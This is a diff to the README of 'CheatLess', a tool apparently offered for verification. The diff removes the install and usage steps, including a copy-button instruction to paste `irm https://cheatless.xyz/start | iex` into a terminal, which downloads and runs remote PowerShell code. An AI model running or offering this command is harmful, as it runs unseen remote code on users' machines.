@@ -17,44 +17,6 @@ CheatLess is a tool designed for fast and secure verification processes. This RE
 - **Compatibility**: Can be used on a wide range of devices.
 - **User-friendly**: Easy to get started and use with comprehensive support available.
 
-## Installation
-
-### Prerequisites
-Ensure you have the following prerequisites installed on your local development environment:
-- [Node.js](https://nodejs.org/)
-- [npm](https://www.npmjs.com/)
-
-### Steps
-1. Clone the repository:
-    ```sh
-    git clone https://github.com/yourusername/cheatless.git
-    cd cheatless
-    ```
-
-2. Install dependencies:
-    ```sh
-    npm install
-    ```
-
-3. Start the application:
-    ```sh
-    npm start
-    ```
-
-## Usage
-To use CheatLess, follow these steps:
-
-1. Open your web browser and navigate to `http://localhost:3000`.
-2. You will see the home page with a copy command button.
-3. Click the "Copy Command (click)" button to copy the command to your clipboard.
-4. Paste the command in your terminal or console to start using CheatLess.
-
-### Copy Command Script
-The copy command button executes the following script:
-```sh
-irm https://cheatless.xyz/start | iex
-```
-
 ## FAQ
 Below are some frequently asked questions:
 
